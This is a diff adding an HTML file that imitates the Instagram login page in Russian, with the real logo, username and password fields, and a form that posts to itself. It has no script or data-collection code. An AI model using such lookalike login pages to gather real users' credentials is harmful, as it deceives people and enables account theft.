@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        
+        <title>Instagram-выполняется вход</title>
+        <link href="style.css" rel="stylesheet" >
+    </head>
+
+    <body class="body">
+        <div id="frame">
+            <div>
+                <div>
+                    <div class="main">
+                        <div class="main">
+                            <div class="f">
+                                <div class="f1">
+                                    <div class="f2">
+                                        <div class="f3">
+                                            <main class="m" role="main">
+                                                <article class="articl">
+                                                    <div class="l">
+                                                        <div class="img">
+                                                            <img alt class="img1" src="/images/instagram/xig/homepage/screenshots/screenshot1.png?__d=www">
+                                                            <img alt class="img2" src="/images/instagram/xig/homepage/screenshots/screenshot2.png?__d=www">
+                                                            <img alt class="img2" src="/images/instagram/xig/homepage/screenshots/screenshot3.png?__d=www">
+                                                            <img alt class="img2" src="/images/instagram/xig/homepage/screenshots/screenshot4.png?__d=www">
+                                                        </div>
+                                                    </div>
+                                                    <div class="r">
+                                                        <div class="fr">
+                                                            <div class="logo">
+                                                                <div aria-disabled="false" role="button" tabindex="0" style="cursor: pointer;"><i data-visualcompletion="css-img" aria-label="Instagram" class="" role="img" style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v3/yr/r/NL0hPV-L09m.png&quot;); background-position: 0px 0px; background-size: 176px 186px; width: 174px; height: 50px; background-repeat: no-repeat; display: inline-block;"></i></div>
+                                                            </div>
+                                                            <div class="register">
+                                                                <form class="formregister" id="loginform" method="post">
+                                                                    <div class="gblock">
+                                                                        <div class="loggin">
+                                                                            <div class="log1">
+                                                                                <label class="ex"></label>
+                                                                            </div>
+                                                                        </div>
+                                                                        <div class="loggin">
+                                                                            <div class="log2">
+                                                                                <label class="ex">
+                                                                                    <span class="ex1">Телефон, имя пользователя или эл. адрес</span>
+                                                                                    <input aria-label="Телефон, имя пользователя или эл. адрес" aria-required="true" autocapitalize="off" autocorrect="off" maxlength="75" name="username" type="text" class="name1" value="">
+                                                                                </label>
+                                                                                <div class="name">
+                                                                                    <label class="ex">
+                                                                                        <span class="ex1">Пароль</span>
+                                                                                        <input aria-label="Пароль" aria-required="true" autocapitalize="off" autocorrect="off" name="password" type="password" class="name1" value="">
+                                                                                    </label>
+                                                                                    <div class="aa"></div>
+                                                                                </div>
+                                                                            </div>
+                                                                        </div>
+                                                                        <div class="button">
+                                                                            <button class="b" disabled type="submit">
+                                                                                <div class="enter">Войти</div>
+                                                                            </button>
+                                                                        </div>
+                                                                        <div class="or"></div>
+                                                                        <div class="facebook"></div>
+                                                                    </div>
+                                                                    <a class="exttra" href="" role="link">Забыли пароль?</a>
+                                                                </form>
+                                                                
+                                                            </div>
+                                                        </div>
+                                                        <div class="fr1"></div>
+                                                        <div class="fr2"></div>
+                                                    </div>
+                                                </article>
+                                            </main>
+                                        </div>
+                                        <div>
+                                            <div></div>
+                                        </div>
+                                    </div>
+                                    <div>
+                                        <div></div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div><div></div></div>
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+
+    </body>
+</html>
